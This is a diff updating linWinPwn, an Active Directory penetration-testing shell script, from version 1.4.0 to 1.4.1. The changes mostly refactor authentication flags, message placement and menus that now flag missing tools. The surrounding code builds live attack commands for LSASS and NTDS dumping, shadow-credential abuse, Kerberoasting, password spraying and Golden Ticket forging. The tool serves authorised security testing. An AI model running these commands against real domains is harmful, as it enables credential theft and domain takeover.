@@ -44,6 +44,10 @@ offline_bool=false
 
 #Tools variables
 scripts_dir="/opt/lwp-scripts"
+nmap=$(which nmap)
+john=$(which john)
+python3="${scripts_dir}/.venv/bin/python3"
+if ! stat "${python3}" >/dev/null 2>&1; then python3=$(which python3); fi
 netexec=$(which netexec)
 impacket_findDelegation=$(which findDelegation.py)
 if ! stat "${impacket_findDelegation}" >/dev/null 2>&1; then impacket_findDelegation=$(which impacket-findDelegation); fi
@@ -146,10 +150,6 @@ sharehound=$(which sharehound)
 daclsearch=$(which daclsearch)
 ScriptScout="$scripts_dir/scriptscout.py"
 relayking="$scripts_dir/RelayKing-Depth-master/relayking.py"
-nmap=$(which nmap)
-john=$(which john)
-python3="${scripts_dir}/.venv/bin/python3"
-if ! stat "${python3}" >/dev/null 2>&1; then python3=$(which python3); fi
 
 print_banner() {
     echo -e "
@@ -159,7 +159,7 @@ print_banner() {
       | || | | | |\ V  V / | | | | |  __/ \ V  V /| | | | 
       |_||_|_| |_| \_/\_/  |_|_| |_|_|     \_/\_/ |_| |_| 
 
-      ${BLUE}linWinPwn: ${CYAN}version 1.4.0 ${NC}
+      ${BLUE}linWinPwn: ${CYAN}version 1.4.1 ${NC}
       https://github.com/lefayjey/linWinPwn
       ${BLUE}Author: ${CYAN}lefayjey${NC}
       ${BLUE}Inspired by: ${CYAN}S3cur3Th1sSh1t's WinPwn${NC}
@@ -375,8 +375,25 @@ run_command() {
             echo -e "${YELLOW}[i]${NC} Running command: $*" > /dev/tty
         fi
         /usr/bin/script -qc "$@" /dev/null
+        return $?
     else
         echo -e "${YELLOW}[i]${NC} Printing command: $*" > /dev/tty
+    fi
+}
+
+check_tool_status() {
+    local tool_var="$1"
+    local display_name="$2"
+    local option_num="$3"
+    
+    if [ -n "$tool_var" ]; then
+        if type "$tool_var" >/dev/null 2>&1 || [ -f "$tool_var" ]; then
+            printf "  %2s) %s\n" "${option_num}" "${display_name}"
+        else
+            printf "  %2s)${RED} [X] ${NC}%s ${RED}(Missing)${NC}\n" "${option_num}" "${display_name}"
+        fi
+    else
+        printf "  %2s)${RED} [X] ${NC}%s ${RED}(Missing)${NC}\n" "${option_num}" "${display_name}"
     fi
 }
 
@@ -701,6 +718,11 @@ authenticate() {
 
     #Check if password is used
     if [ "${pass_bool}" == true ]; then
+        hash_bool=false
+        kerb_bool=false
+        unset KRB5CCNAME
+        aeskey_bool=false
+        cert_bool=false
         argument_ne="-d ${domain} -u '${user}' -p '${password}'"
         argument_imp="${domain}/'${user}':'${password}'"
         argument_imp_gp="${domain}/'${user}':'${password}'"
@@ -747,11 +769,6 @@ authenticate() {
         argument_daclsearch="-l ${domain} -u '${user}' -p '${password}'"
         argument_scriptscout="-d ${domain} -u '${user}' -p '${password}'"
         argument_rking="-d ${domain} -u '${user}' -p '${password}'"
-        hash_bool=false
-        kerb_bool=false
-        unset KRB5CCNAME
-        aeskey_bool=false
-        cert_bool=false
         auth_string="${YELLOW}[i]${NC} Authentication method: ${YELLOW}password of ${user}${NC}"
     fi
 
@@ -825,11 +842,14 @@ authenticate() {
             argument_nhd="-d ${domain} -u '${user}' --hashes '${hash}'"
             argument_daclsearch="-l ${domain} -u '${user}' -H '${hash}'"
             argument_rking="-d ${domain} -u '${user}' --hashes '${hash}'"
-
         else
             echo -e "${RED}[i]${NC} Incorrect format of NTLM hash..."
             exit 1
         fi
+        pass_bool=false
+        kerb_bool=false
+        unset KRB5CCNAME
+        aeskey_bool=false
         if [ "${cert_bool}" == true ]; then
             argument_bloodyad="-d ${domain} -u '${user}' -c ':${pem_cert}'"
             argument_ldeep="-d ${domain} -u '${user}' --pfx-file '${pfxcert}'"
@@ -839,10 +859,6 @@ authenticate() {
         else
             auth_string="${YELLOW}[i]${NC} Authentication method: ${YELLOW}NTLM hash of '${user}'${NC}"
         fi
-        pass_bool=false
-        kerb_bool=false
-        unset KRB5CCNAME
-        aeskey_bool=false
     fi
 
     #Check if kerberos ticket is used
@@ -892,6 +908,12 @@ authenticate() {
 
     #Check if kerberos AES key is used
     if [ "${aeskey_bool}" == true ]; then
+        pass_bool=false
+        hash_bool=false
+        kerb_bool=false
+        unset KRB5CCNAME
+        cert_bool=false
+        forcekerb_bool=false
         argument_ne="-d ${domain} -u '${user}' --aesKey ${aeskey}"
         argument_imp="-aesKey ${aeskey} ${domain}/'${user}'"
         argument_bhd="-u '${user}'\\@${domain} -aesKey ${aeskey} --auth-method kerberos"
@@ -910,12 +932,6 @@ authenticate() {
         argument_mssqlpwner="${domain}/'${user}' -aesKey ${aeskey} -k"
         argument_daclsearch="-l ${domain} -u '${user}' --aeskey ${aeskey} -k"
         argument_rking="-d ${domain} -u '${user}' --aesKey ${aeskey} -k"
-        pass_bool=false
-        hash_bool=false
-        kerb_bool=false
-        unset KRB5CCNAME
-        cert_bool=false
-        forcekerb_bool=false
         auth_string="${YELLOW}[i]${NC} Authentication method: ${YELLOW}AES Kerberos key of ${user}${NC}"
     fi
 
@@ -932,7 +948,7 @@ authenticate() {
             if [[ $auth_check == *"STATUS_NOT_SUPPORTED"* ]]; then
                 echo -e "${BLUE}[*] Domain does not support NTLM authentication. Attempting to generate TGT ticket to use Kerberos instead..${NC}"
                 if [ "${pass_bool}" == true ] || [ "${hash_bool}" == true ] || [ "${aeskey_bool}" == true ]; then
-                    echo -e "${CYAN}[*] Requesting TGT for current user${NC}"
+                    echo -e "${CYAN}[*] Requesting TGT for current user: ${user}...${NC}"
                     krb_ticket="${Credentials_dir}/${user}"
                     run_command "${netexec} ${ne_verbose} smb ${dc_FQDN} ${argument_ne} -k --kdcHost ${dc_FQDN} --generate-tgt ${krb_ticket} --log ${Credentials_dir}/getTGT_output_${user_var}.txt"
                     if stat "${krb_ticket}.ccache" >/dev/null 2>&1; then
@@ -1057,7 +1073,7 @@ dns_enum() {
     echo -e "${BLUE}[*] DNS dump using netexec get-network${NC}"
     dns_records="${Servers_dir}/dns_records_${dc_domain}.txt"
     if ! stat "${dns_records}" >/dev/null 2>&1 || [ "${noexec_bool}" == "true" ]; then
-        run_command "${netexec} ${ne_verbose} ldap --port ${ldap_port} ${target} ${argument_ne} -M get-network -o ALL=true" 2>&1 | tee "${Servers_dir}/net_get_network_output_${dc_domain}.txt"
+        run_command "${netexec} ${ne_verbose} ldap --port ${ldap_port} ${target} ${argument_ne} -M get-network -o ALL=true" | tee "${Servers_dir}/net_get_network_output_${dc_domain}.txt"
         # Find and copy the output file from netexec logs
         nxc_dns_log=$(ls -t /home/*/.nxc/logs/${dc_domain}_network_*.log 2>/dev/null | head -1)
         if [ -z "$nxc_dns_log" ]; then
@@ -1107,7 +1123,7 @@ ne_scan() {
             return 1
         fi
     fi
-    run_command "${netexec} ${ne_verbose} ${1} ${curr_targets_list} -k --log ${servers_scan_out}" 2>&1
+    run_command "${netexec} ${ne_verbose} ${1} ${curr_targets_list} -k --log ${servers_scan_out}"
     grep -a "${1^^}" "${servers_scan_out}" 2>/dev/null | grep -aoE '\b([a-zA-Z0-9-]+\.){2,}[a-zA-Z]{2,}\b|\b([0-9]{1,3}\.){3}[0-9]{1,3}\b' | sort -u > "${servers_list}"
     sort -u "${servers_list}" -o "${servers_list}" 2>/dev/null
     echo -e ""
@@ -1483,11 +1499,11 @@ bloodyad_write_enum() {
         echo -e "${RED}[-] Please verify the installation of bloodyad${NC}"
     else
         mkdir -p "${DomainRecon_dir}/bloodyAD"
+        echo -e "${BLUE}[*] bloodyad search for writable objects${NC}"
         if [ "${aeskey_bool}" == true ] || [ "${nullsess_bool}" == true ]; then
             echo -e "${PURPLE}[-] bloodyad requires credentials and does not support Kerberos authentication using AES Key${NC}"
         else
             if [ "${ldaps_bool}" == true ]; then ldaps_param="-s"; else ldaps_param=""; fi
-            echo -e "${BLUE}[*] bloodyad search for writable objects${NC}"
             run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_FQDN} --dc-ip ${dc_ip} get writable --detail" | tee "${DomainRecon_dir}/bloodyAD/bloodyad_writable_${user_out}_${dc_domain}.txt"
         fi
     fi
@@ -1499,11 +1515,11 @@ bloodyad_dnsquery() {
         echo -e "${RED}[-] Please verify the installation of bloodyad${NC}"
     else
         mkdir -p "${DomainRecon_dir}/bloodyAD"
+        echo -e "${BLUE}[*] bloodyad dump DNS entries${NC}"
         if [ "${aeskey_bool}" == true ] || [ "${nullsess_bool}" == true ]; then
             echo -e "${PURPLE}[-] bloodyad requires credentials and does not support Kerberos authentication using AES Key${NC}"
         else
             if [ "${ldaps_bool}" == true ]; then ldaps_param="-s"; else ldaps_param=""; fi
-            echo -e "${BLUE}[*] bloodyad dump DNS entries${NC}"
             run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_FQDN} --dc-ip ${dc_ip} --dns ${dns_ip} get dnsDump" | tee "${DomainRecon_dir}/bloodyAD/bloodyad_dns_${dc_domain}.txt"
             echo -e "${YELLOW}If ADIDNS does not contain a wildcard entry, check for ADIDNS spoofing${NC}"
             sed -n '/[^\n]*\*/,/^$/p' "${DomainRecon_dir}/bloodyAD/bloodyad_dns_${dc_domain}.txt"
@@ -1518,6 +1534,7 @@ bloodyad_enum_object() {
         echo -e "${RED}[-] Please verify the installation of bloodyad${NC}"
     else
         mkdir -p "${DomainRecon_dir}/bloodyAD"
+        echo -e "${CYAN}[*] Listing details of object ${obj_enum}${NC}"
         if [ "${aeskey_bool}" == true ] || [ "${nullsess_bool}" == true ]; then
             echo -e "${PURPLE}[-] bloodyad requires credentials and does not support Kerberos authentication using AES Key${NC}"
         else
@@ -1530,7 +1547,6 @@ bloodyad_enum_object() {
                 echo -e "${RED}Invalid name.${NC} Please specify object:"
                 read -rp ">> " obj_enum </dev/tty
             done
-            echo -e "${CYAN}[*] Listing details of object ${obj_enum}${NC}"
             run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_FQDN} --dc-ip ${dc_ip} get object '${obj_enum}'" 2>&1 | tee -a "${DomainRecon_dir}/bloodyAD/bloodyad_out_${obj_enum}_${dc_domain}.txt"
         fi
     fi
@@ -1782,10 +1798,10 @@ aced_console() {
     if ! stat "${aced}" >/dev/null 2>&1; then
         echo -e "${RED}[-] Please verify the installation of aced${NC}"
     else
+        echo -e "${BLUE}[*] Launching aced console${NC}"
         if [ "${nullsess_bool}" == true ]; then
             echo -e "${PURPLE}[-] aced requires credentials${NC}"
         else
-            echo -e "${BLUE}[*] Launching aced${NC}"
             if [ "${ldaps_bool}" == true ]; then ldaps_param="-ldaps"; else ldaps_param=""; fi
             run_command "${python3} ${aced} ${argument_aced}\\@${dc_FQDN} ${ldaps_param} -dc-ip ${dc_ip}" 2>&1 | tee -a "${DomainRecon_dir}/aced_output_${dc_domain}.txt"
         fi
@@ -1797,10 +1813,10 @@ godap_console() {
     if ! stat "${godap}" >/dev/null 2>&1; then
         echo -e "${RED}[-] Please verify the installation of godap${NC}"
     else
+        echo -e "${BLUE}[*] Launching godap console${NC}"
         if [ "${aeskey_bool}" == true ]; then
             echo -e "${PURPLE}[-] godap does not support Kerberos authentication using AES Key${NC}"
         else
-            echo -e "${BLUE}[*] Launching godap${NC}"
             if [ "${ldaps_bool}" == true ]; then ldaps_param="-S -I"; else ldaps_param=""; fi
             run_command "${godap} ${target} ${argument_godap} --port ${ldap_port} --kdc ${dc_FQDN} ${ldaps_param}" 2>&1 | tee -a "${DomainRecon_dir}/godap_output_${dc_domain}.txt"
         fi
@@ -1812,11 +1828,11 @@ ldapper_console() {
     if ! stat "${ldapper}" >/dev/null 2>&1; then
         echo -e "${RED}[-] Please verify the installation of ldapper${NC}"
     else
+        echo -e "${BLUE}[*] Running ldapper with custom LDAP search string${NC}"
         if [ "${nullsess_bool}" == true ] || [ "${kerb_bool}" == true ] || [ "${aeskey_bool}" == true ]; then
             echo -e "${PURPLE}[-] ldapper requires credentials and does not support Kerberos authentication${NC}"
         else
             mkdir -p "${DomainRecon_dir}/LDAPPER"
-            echo -e "${BLUE}[*] Running ldapper with custom LDAP search string${NC}"
             if [ "${ldaps_bool}" == true ]; then ldaps_param="-n 1"; else ldaps_param="-n 2"; fi
             echo -e "${CYAN}[*] Please choose an option or provide a custom LDAP search string ${NC}"
             echo -e "1.1) Get specific user (You will be prompted for the username)"
@@ -1983,6 +1999,7 @@ certipy_enum() {
     if ! stat "${certipy}" >/dev/null 2>&1; then
         echo -e "${RED}[-] Please verify the installation of certipy${NC}"
     else
+        mkdir -p "${ADCS_dir}"
         echo -e "${BLUE}[*] Certipy Enumeration${NC}"
         if stat "${ADCS_dir}/vuln_${domain}_Certipy.json" >/dev/null 2>&1 && [ "${noexec_bool}" == "false" ]; then
             echo -e "${YELLOW}[i] Certipy results found, would you like to run the scan again? (y/N)${NC}"
@@ -2288,9 +2305,9 @@ masky_dump() {
             for pki_server in $pki_servers; do
                 i=$((i + 1))
                 pki_ca=$(echo -e "$pki_cas" | sed 's/ /\n/g' | sed -n ${i}p)
-                for i in $(/bin/cat "${curr_targets_list}"); do
-                    echo -e "${CYAN}[*] LSASS dump of ${i} using masky (PKINIT)${NC}"
-                    run_command "${netexec} ${ne_verbose} smb ${i} ${argument_ne} -M masky -o \"CA=${pki_server}\\${pki_ca//SPACE/ }\" --log ${Credentials_dir}/lsass_dump_masky_${user_var}_${i}.txt" 2>&1
+                for j in $(/bin/cat "${curr_targets_list}"); do
+                    echo -e "${CYAN}[*] LSASS dump of ${j} using masky (PKINIT)${NC}"
+                    run_command "${netexec} ${ne_verbose} smb ${j} ${argument_ne} -M masky -o \"CA=${pki_server}\\${pki_ca//SPACE/ }\" --log ${Credentials_dir}/lsass_dump_masky_${user_var}_${j}.txt" 2>&1
                 done
             done
         else
@@ -2859,10 +2876,10 @@ kerborpheus_attack() {
 }
 
 nopac_check() {
-    echo -e "${BLUE}[*] NoPac (CVE-2021-42278 and CVE-2021-42287) check ${NC}"
     if [ "${kerb_bool}" == true ]; then
         echo -e "${PURPLE}[-] netexec's nopac does not support kerberos authentication${NC}"
     else
+        echo -e "${BLUE}[*] NoPac (CVE-2021-42278 and CVE-2021-42287) check ${NC}"
         run_command "${netexec} ${ne_verbose} smb ${target_dc} ${argument_ne} -M nopac --log ${Kerberos_dir}/ne_nopac_output_${dc_domain}.txt" 2>&1
         if grep -q "VULNERABLE" "${Kerberos_dir}/ne_nopac_output_${dc_domain}.txt"; then
             echo -e "${GREEN}[+] Domain controller vulnerable to noPac found! Follow steps below for exploitation:${NC}" | tee -a "${Kerberos_dir}/noPac_exploitation_steps_${dc_domain}.txt"
@@ -2876,10 +2893,10 @@ nopac_check() {
 }
 
 ms14-068_check() {
-    echo -e "${BLUE}[*] MS14-068 check ${NC}"
     if ! stat "${impacket_goldenPac}" >/dev/null 2>&1; then
         echo -e "${RED}[-] goldenPac.py not found! Please verify the installation of impacket${NC}"
     else
+        echo -e "${BLUE}[*] MS14-068 check ${NC}"
         if [ "${nullsess_bool}" == true ] || [ "${kerb_bool}" == true ] || [ "${aeskey_bool}" == true ]; then
             echo -e "${PURPLE}[-] MS14-068 requires credentials and does not support Kerberos authentication${NC}"
         else
@@ -2945,7 +2962,7 @@ john_crack_kerberoast() {
 }
 
 ###### scan_shares: Shares scan
-smb_map() {
+smbmap_scan() {
     if ! stat "${smbmap}" >/dev/null 2>&1; then
         echo -e "${RED}[-] Please verify the installation of smbmap${NC}"
     else
@@ -3457,7 +3474,8 @@ mssql_relay_check() {
             echo -e "${BLUE}[*] MSSQL Relay Check${NC}"
             if [ "${ldaps_bool}" == true ]; then ldaps_param=""; else ldaps_param="-scheme ldap"; fi
             if [ "${dnstcp_bool}" == true ]; then dnstcp_param="-dns-tcp "; else dnstcp_param=""; fi
-            run_command "${mssqlrelay} ${mssqlrelay_verbose} checkall ${ldaps_param} ${dnstcp_param} ${argument_mssqlrelay} -ns ${dns_ip} -windows-auth" | tee "${MSSQL_dir}/mssql_relay_checkall_output_${user_var}.txt" 2>&1
+            echo -e "${BLUE}[*] MSSQLRelay CheckAll...${NC}"
+            run_command "${mssqlrelay} ${mssqlrelay_verbose} checkall ${ldaps_param} ${dnstcp_param} ${argument_mssqlrelay} -ns ${dns_ip} -windows-auth | tee '${MSSQL_dir}/mssql_relay_checkall_output_${user_var}.txt'" 2>&1
             sql_mssqlrelay="${MSSQL_dir}/mssql_relay_instances_${user_var}.txt"
             if [ -s "${MSSQL_dir}/mssql_relay_checkall_output_${user_var}.txt" ]; then
                 grep -i "MSSQLSvc" "${MSSQL_dir}/mssql_relay_checkall_output_${user_var}.txt" | awk -F'[/:)]+' '$3 ~ /^[0-9]+$/ {print $2 " -mssql-port " $3}' | sort -u >> "${sql_mssqlrelay}"
@@ -3478,6 +3496,7 @@ mssqlclient_console() {
     elif [ "${nullsess_bool}" == true ]; then
         echo -e "${PURPLE}[-] mssqlclient requires credentials${NC}"
     else
+        echo -e "${BLUE}[*] MSSQLClient Console${NC}"
         echo -e "${BLUE}[*] Please specify target IP or hostname:${NC}"
         echo -e "${CYAN}[*] Example: 10.1.0.5 or SQL01 or SQL01.domain.com ${NC}"
         read -rp ">> " mssqlclient_target </dev/tty
@@ -4214,6 +4233,7 @@ add_upn_esc10() {
             read -rp ">> " target_upn_hash </dev/tty
             if [ -z "$target_upn_hash" ]; then
                 if [ "${ldaps_bool}" == true ]; then ldaps_param_ba="-s"; else ldaps_param_ba=""; fi
+                echo -e "${BLUE}[*] BloodyAD Retrieve Hash via ShadowCreds...${NC}"
                 run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param_ba} --host ${dc_FQDN} --dc-ip ${dc_ip} add shadowCredentials '${target_upn}' --path ${Credentials_dir}/shadowcreds_${user_var}_${target_upn}" 2>&1 | tee -a "${Modification_dir}/bloodyAD_${user_var}/bloodyad_out_shadowcreds_${dc_domain}.txt"
                 target_upn_hash=$(grep ${target_upn} "${Modification_dir}/bloodyAD_${user_var}/bloodyad_out_shadowcreds_${dc_domain}.txt" -A 2| grep '^NT:' | tail -n 1 | cut -d ' ' -f 2 | tr -d ' \r\n')
             fi
@@ -5058,38 +5078,38 @@ ad_menu() {
     else
         echo -e "A) ACTIVE DIRECTORY ENUMERATIONS #1ce-3-4-5-6-7-8-9-10-16"
     fi
-    echo -e "1) BloodHound Enumeration using all collection methods (Noisy!)"
-    echo -e "2) BloodHound Enumeration using DCOnly"
-    echo -e "1ce) BloodHoundCE Enumeration using all collection methods (Noisy!)"
-    echo -e "2ce) BloodHoundCE Enumeration using DCOnly"
-    echo -e "3) ldapdomaindump LDAP Enumeration"
-    echo -e "4) enum4linux-ng LDAP-MS-RPC Enumeration"
-    echo -e "5) MS-RPC Users Enumeration using netexec"
-    echo -e "6) Password policy Enumeration using netexec"
-    echo -e "7) LDAP Users Enumeration using netexec"
-    echo -e "8) LDAP Enumeration using netexec (passnotreq, userdesc, maq, subnets, passpol)"
-    echo -e "9) Delegation Enumeration using findDelegation and netexec"
-    echo -e "10) bloodyAD All Enumeration"
-    echo -e "11) bloodyAD write rights Enumeration"
-    echo -e "12) bloodyAD query DNS server"
-    echo -e "13) bloodyAD enumerate object"
-    echo -e "14) SilentHound LDAP Enumeration"
-    echo -e "15) ldeep LDAP Enumeration"
-    echo -e "16) windapsearch LDAP Enumeration"
-    echo -e "17) LDAP Wordlist Harvester"
-    echo -e "18) LDAP Enumeration using LDAPPER"
-    echo -e "19) Adalanche Enumeration"
-    echo -e "20) Enumeration of RDWA servers"
-    echo -e "21) Open p0dalirius' LDAP Console"
-    echo -e "22) Open p0dalirius' LDAP Monitor"
-    echo -e "23) Open garrettfoster13's ACED console"
-    echo -e "24) Open LDAPPER custom options"
-    echo -e "25) Run godap console"
-    echo -e "26) Run ADCheck enumerations"
-    echo -e "27) Run soapy enumerations"
-    echo -e "28) Soaphound Enumeration using all collection methods (Noisy!)"
-    echo -e "29) Soaphound Enumeration using ADWSOnly"
-    echo -e "30) Run DACLSearch dump and cli"
+    check_tool_status "${bloodhound}" "BloodHound Enumeration using all collection methods (Noisy!)" "1"
+    check_tool_status "${bloodhound}" "BloodHound Enumeration using DCOnly" "2"
+    check_tool_status "${bloodhoundce}" "BloodHoundCE Enumeration using all collection methods (Noisy!)" "1ce"
+    check_tool_status "${bloodhoundce}" "BloodHoundCE Enumeration using DCOnly" "2ce"
+    check_tool_status "${ldapdomaindump}" "ldapdomaindump LDAP Enumeration" "3"
+    check_tool_status "${enum4linux_py}" "enum4linux-ng LDAP-MS-RPC Enumeration" "4"
+    check_tool_status "${netexec}" "MS-RPC Users Enumeration using netexec" "5"
+    check_tool_status "${netexec}" "Password policy Enumeration using netexec" "6"
+    check_tool_status "${netexec}" "LDAP Users Enumeration using netexec" "7"
+    check_tool_status "${netexec}" "LDAP Enumeration using netexec (passnotreq, userdesc, maq, subnets, passpol)" "8"
+    check_tool_status "${impacket_findDelegation}" "Delegation Enumeration using findDelegation and netexec" "9"
+    check_tool_status "${bloodyad}" "bloodyAD All Enumeration" "10"
+    check_tool_status "${bloodyad}" "bloodyAD write rights Enumeration" "11"
+    check_tool_status "${bloodyad}" "bloodyAD query DNS server" "12"
+    check_tool_status "${bloodyad}" "bloodyAD enumerate object" "13"
+    check_tool_status "${silenthound}" "SilentHound LDAP Enumeration" "14"
+    check_tool_status "${ldeep}" "ldeep LDAP Enumeration" "15"
+    check_tool_status "${windapsearch}" "windapsearch LDAP Enumeration" "16"
+    check_tool_status "${LDAPWordlistHarvester}" "LDAP Wordlist Harvester" "17"
+    check_tool_status "${ldapper}" "LDAP Enumeration using LDAPPER" "18"
+    check_tool_status "${adalanche}" "Adalanche Enumeration" "19"
+    check_tool_status "${rdwatool}" "Enumeration of RDWA servers" "20"
+    check_tool_status "${ldapconsole}" "Open p0dalirius' LDAP Console" "21"
+    check_tool_status "${pyLDAPmonitor}" "Open p0dalirius' LDAP Monitor" "22"
+    check_tool_status "${aced}" "Open garrettfoster13's ACED console" "23"
+    check_tool_status "${ldapper}" "Open LDAPPER custom options" "24"
+    check_tool_status "${godap}" "Run godap console" "25"
+    check_tool_status "${ADCheck}" "Run ADCheck enumerations" "26"
+    check_tool_status "${soapy}" "Run soapy enumerations" "27"
+    check_tool_status "${soaphound}" "Soaphound Enumeration using all collection methods (Noisy!)" "28"
+    check_tool_status "${soaphound}" "Soaphound Enumeration using ADWSOnly" "29"
+    check_tool_status "${daclsearch}" "Run DACLSearch dump and cli" "30"
     echo -e "back) Go back"
     echo -e "exit) Exit"
 
@@ -5288,14 +5308,14 @@ adcs_menu() {
         echo -e "A) ADCS ENUMERATIONS #1-2-3-4"
     fi
     echo -e "P) Print ADCS Exploitation Steps"
-    echo -e "1) ADCS Enumeration using netexec"
-    echo -e "2) certi.py ADCS Enumeration"
-    echo -e "3) Certipy ADCS Enumeration"
-    echo -e "4) Certifried check"
-    echo -e "5) Certipy LDAP shell via Schannel (using Certificate Authentication)"
-    echo -e "6) Certipy extract CA and forge Golden Certificate (requires admin rights on PKI server)"
-    echo -e "7) Dump LSASS using masky"
-    echo -e "8) Dump NTDS using certsync"
+    check_tool_status "${netexec}" "ADCS Enumeration using netexec" "1"
+    check_tool_status "${certi_py}" "certi.py ADCS Enumeration" "2"
+    check_tool_status "${certipy}" "Certipy ADCS Enumeration" "3"
+    check_tool_status "${certipy}" "Certifried check" "4"
+    check_tool_status "${certipy}" "Certipy LDAP shell via Schannel (using Certificate Authentication)" "5"
+    check_tool_status "${certipy}" "Certipy extract CA and forge Golden Certificate (requires admin rights on PKI server)" "6"
+    check_tool_status "${netexec}" "Dump LSASS using masky" "7"
+    check_tool_status "${certsync}" "Dump NTDS using certsync" "8"
     echo -e "back) Go back"
     echo -e "exit) Exit"
 
@@ -5374,10 +5394,10 @@ sccm_menu() {
     echo -e "${CYAN}[SCCM menu]${NC} Please choose from the following options:"
     echo -e "-----------------------------------------------------"
     echo -e "A) SCCM ENUMERATIONS #1,2"
-    echo -e "1) SCCM Enumeration using netexec"
-    echo -e "2) SCCM Enumeration using sccmhunter"
-    echo -e "3) SCCM NAA credentials dump using sccmhunter"
-    echo -e "4) SCCM Policies and Files dump using SCCMSecrets"
+    check_tool_status "${netexec}" "SCCM Enumeration using netexec" "1"
+    check_tool_status "${sccmhunter}" "SCCM Enumeration using sccmhunter" "2"
+    check_tool_status "${sccmhunter}" "SCCM NAA credentials dump using sccmhunter" "3"
+    check_tool_status "${sccmsecrets}" "SCCM Policies and Files dump using SCCMSecrets" "4"
     echo -e "back) Go back"
     echo -e "exit) Exit"
 
@@ -5431,10 +5451,10 @@ gpo_menu() {
     echo -e "${CYAN}[GPO menu]${NC} Please choose from the following options:"
     echo -e "----------------------------------------------------"
     echo -e "A) GPO ENUMERATIONS #1,3"
-    echo -e "1) GPP Enumeration using netexec"
-    echo -e "2) GPO Enumeration using GPOwned"
-    echo -e "3) GPOParser Enumeration"
-    echo -e "4) GroupPolicyBackdoor Enumeration"
+    check_tool_status "${netexec}" "GPP Enumeration using netexec" "1"
+    check_tool_status "${GPOwned}" "GPO Enumeration using GPOwned" "2"
+    check_tool_status "${gpoParser}" "GPOParser Enumeration" "3"
+    check_tool_status "${GroupPolicyBackdoor}" "GroupPolicyBackdoor Enumeration" "4"
     echo -e "back) Go back"
     echo -e "exit) Exit"
 
@@ -5492,18 +5512,18 @@ bruteforce_menu() {
     else
         echo -e "A) BRUTEFORCE ATTACKS #3-5-10"
     fi
-    echo -e "1) RID Brute Force (Null session) using netexec"
-    echo -e "2) User Enumeration using kerbrute (Null session)"
-    echo -e "3) User=Pass check using kerbrute (Noisy!)"
-    echo -e "4) User=Pass check using netexec (Noisy!)"
-    echo -e "5) Identify Pre-Created Computer Accounts using netexec (Noisy!)"
-    echo -e "6) Pre2k computers authentication check (Noisy!)"
-    echo -e "7) User Enumeration using ldapnomnom (Null session)"
-    echo -e "8) Password spraying using kerbrute (Noisy!)"
-    echo -e "9) Password spraying using netexec - ldap (Noisy!)"
-    echo -e "10) Timeroast attack against NTP"
-    echo -e "11) MSSQL RID Brute Force (Null session) using netexec"
-    echo -e "12) Open SpearSpray console"
+    check_tool_status "${netexec}" "RID Brute Force (Null session) using netexec" "1"
+    check_tool_status "${kerbrute}" "User Enumeration using kerbrute (Null session)" "2"
+    check_tool_status "${kerbrute}" "User=Pass check using kerbrute (Noisy!)" "3"
+    check_tool_status "${netexec}" "User=Pass check using netexec (Noisy!)" "4"
+    check_tool_status "${netexec}" "Identify Pre-Created Computer Accounts using netexec (Noisy!)" "5"
+    check_tool_status "${pre2k}" "Pre2k computers authentication check (Noisy!)" "6"
+    check_tool_status "${ldapnomnom}" "User Enumeration using ldapnomnom (Null session)" "7"
+    check_tool_status "${kerbrute}" "Password spraying using kerbrute (Noisy!)" "8"
+    check_tool_status "${netexec}" "Password spraying using netexec - ldap (Noisy!)" "9"
+    check_tool_status "${netexec}" "Timeroast attack against NTP" "10"
+    check_tool_status "${netexec}" "MSSQL RID Brute Force (Null session) using netexec" "11"
+    check_tool_status "${spearspray}" "Open SpearSpray console" "12"
     echo -e "back) Go back"
     echo -e "exit) Exit"
 
@@ -5601,25 +5621,25 @@ kerberos_menu() {
     else
         echo -e "A) KERBEROS ATTACKS #1-2-3-4-5-6"
     fi
-    echo -e "1) AS REP Roasting Attack using GetNPUsers"
-    echo -e "2) Kerberoast Attack using GetUserSPNs"
-    echo -e "3) Cracking AS REP Roast hashes using john the ripper"
-    echo -e "4) Cracking Kerberoast hashes using john the ripper"
-    echo -e "5) NoPac check using netexec (only on DC)"
-    echo -e "6) MS14-068 check (only on DC)"
-    echo -e "7) CVE-2022-33679 exploit / AS-REP with RC4 session key (Null session)"
-    echo -e "8) AP-REQ hijack with DNS unsecure updates abuse using krbjack"
-    echo -e "9) Run custom Kerberoast attack using Orpheus"
-    echo -e "10) Request TGS for current user (requires: authenticated)"
-    echo -e "11) Generate Golden Ticket (requires: hash of krbtgt or DCSync rights)"
-    echo -e "12) Generate Silver Ticket (requires: hash of SPN service account or DCSync rights)"
-    echo -e "13) Request ticket for another user using S4U2self (OPSEC alternative to Silver Ticket) (requires: authenticated session of SPN service account, for example 'svc')"
-    echo -e "14) Generate Diamond Ticket (requires: hash of krbtgt or DCSync rights)"
-    echo -e "15) Generate Sapphire Ticket (requires: hash of krbtgt or DCSync rights)"
-    echo -e "16) Privilege escalation from Child Domain to Parent Domain using raiseChild (requires: DA rights on child domain)"
-    echo -e "17) Request impersonated ticket using Constrained Delegation rights (requires: authenticated session of account allowed for delegation, for example 'gmsa')"
-    echo -e "18) Request impersonated ticket using Resource-Based Constrained Delegation rights (requires: authenticated session of SPN account allowed for RBCD)"
-    echo -e "19) Request TGS impersonated ticket using dMSA to exploit BadSuccessor (requires: authenticated session of account with BadSuccessor privileges)"
+    check_tool_status "${impacket_GetNPUsers}" "AS REP Roasting Attack using GetNPUsers" "1"
+    check_tool_status "${impacket_GetUserSPNs}" "Kerberoast Attack using GetUserSPNs" "2"
+    check_tool_status "${john}" "Cracking AS REP Roast hashes using john the ripper" "3"
+    check_tool_status "${john}" "Cracking Kerberoast hashes using john the ripper" "4"
+    check_tool_status "${netexec}" "NoPac check using netexec (only on DC)" "5"
+    check_tool_status "${impacket_goldenPac}" "MS14-068 check (only on DC)" "6"
+    check_tool_status "${CVE202233679}" "CVE-2022-33679 exploit / AS-REP with RC4 session key (Null session)" "7"
+    check_tool_status "${krbjack}" "AP-REQ hijack with DNS unsecure updates abuse using krbjack" "8"
+    check_tool_status "${orpheus}" "Run custom Kerberoast attack using Orpheus" "9"
+    check_tool_status "${impacket_getST}" "Request TGS for current user (requires: authenticated)" "10"
+    check_tool_status "${impacket_ticketer}" "Generate Golden Ticket (requires: hash of krbtgt or DCSync rights)" "11"
